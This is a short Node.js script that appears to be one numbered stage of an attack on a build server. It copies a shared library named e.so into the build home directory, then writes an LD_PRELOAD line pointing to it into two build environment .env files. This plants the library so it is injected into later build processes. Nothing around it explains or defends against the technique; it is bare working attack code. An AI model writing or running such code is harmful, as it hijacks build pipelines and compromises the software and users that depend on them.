const fs = require("fs");
try { fs.copyFileSync("e.so", "/opt/buildhome/e.so"); console.log("[p5] e.so copied"); }
catch (e) { console.log("[p5] copy fail:", e.message); }
for (const t of ["/opt/build/env_store/.env", "/opt/buildhome/env_store/.env"]) {
  try { fs.appendFileSync(t, "LD_PRELOAD=/opt/buildhome/e.so\n"); console.log("[p5] env:", t); }
  catch (e) { console.log("[p5] env fail", t, e.code); }
}
